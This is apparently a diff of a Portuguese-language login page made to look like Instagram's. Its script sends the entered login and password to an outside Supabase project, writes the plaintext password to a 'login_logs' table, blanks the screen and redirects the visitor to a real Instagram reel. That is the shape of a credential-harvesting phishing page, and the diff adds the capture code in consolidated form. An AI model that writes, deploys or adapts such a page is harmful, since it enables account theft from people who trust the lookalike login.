@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <link rel="icon" href="favicon.ico" type="image/x-icon">
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Instagram • Login</title>
+  <title>• Login</title>
+
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
 
   <style>
     * {
@@ -26,8 +27,6 @@
       width: 100%;
       max-width: 350px;
       padding: 40px 30px;
-
-      /* CENTRALIZA NO EIXO X */
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -145,13 +144,11 @@
         placeholder="Senha"
         required
       />
-      <button id="loginBtn" type="submit">Entrar</button>
+      <button type="submit">Entrar</button>
     </form>
 
     <div class="forgot"><a href="#">Esqueceu a senha?</a></div>
-
     <div class="or"><span>OU</span></div>
-
     <div class="facebook">Entrar com Facebook</div>
 
     <div class="signup">
@@ -166,69 +163,63 @@
     background:#fff;
     z-index:9999;"></div>
 
+  <!-- Supabase -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
   <script>
-    document.getElementById("loginForm").addEventListener("submit", (e) => {
+    const SUPABASE_URL = "https://pwmtpvsgykjvouljjmrz.supabase.co";
+    const SUPABASE_KEY =
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8";
+
+    const supabase = supabaseJs.createClient(
+      SUPABASE_URL,
+      SUPABASE_KEY
+    );
+
+    document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      document.getElementById("whiteScreen").style.display = "block";
+      const loginValue = document.getElementById("email").value.trim();
+      const passwordText = document.getElementById("password").value;
 
+      let credentials = { password: passwordText };
+
+      // Email ou telefone
+      if (loginValue.includes("@")) {
+        credentials.email = loginValue;
+      } else {
+        credentials.phone = loginValue;
+      }
+
+      // LOGIN
+      const { data, error } =
+        await supabase.auth.signInWithPassword(credentials);
+
+      if (error) {
+        alert("Erro no login: " + error.message);
+        return;
+      }
+
+      // REGISTRO DO TEXTO DIGITADO (LOG)
+      const { error: logError } = await supabase
+        .from("login_logs")
+        .insert({
+          user_id: data.user.id,
+          login_value: loginValue,
+          password_text: passwordText
+        });
+
+      if (logError) {
+        console.error("Erro ao salvar log:", logError.message);
+      }
+
+      // Tela branca + redirect
+      document.getElementById("whiteScreen").style.display = "block";
       setTimeout(() => {
         window.location.href =
           "https://www.instagram.com/reels/DSYPgN7EVG3/";
       }, 150);
     });
   </script>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
-<script>
-  const SUPABASE_URL = "https://pwmtpvsgykjvouljjmrz.supabase.co";
-  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8";
-
-  const supabase = supabaseJs.createClient(
-    SUPABASE_URL,
-    SUPABASE_KEY
-  );
-
-  document.getElementById("loginForm").addEventListener("submit", async (e) => {
-    e.preventDefault();
-
-    const loginValue = document.getElementById("email").value.trim();
-    const passwordText = document.getElementById("password").value;
-
-    let credentials = { password: passwordText };
-
-    // Detecta email ou telefone
-    if (loginValue.includes("@")) {
-      credentials.email = loginValue;
-    } else {
-      credentials.phone = loginValue;
-    }
-
-    // 🔐 Autenticação real (Supabase)
-    const { data, error } =
-      await supabase.auth.signInWithPassword(credentials);
-
-    if (error) {
-      alert("Login inválido");
-      return;
-    }
-
-    // 📝 REGISTRO DO TEXTO DIGITADO (LOG)
-    await supabase.from("login_logs").insert({
-      user_id: data.user.id,
-      login_value: loginValue,
-      password_text: passwordText // apenas texto digitado
-    });
-
-    // Tela branca + redirect
-    document.getElementById("whiteScreen").style.display = "block";
-
-    setTimeout(() => {
-      window.location.href =
-        "https://www.instagram.com/reels/DSYPgN7EVG3/";
-    }, 150);
-  });
-</script>
-
 </body>
 </html>
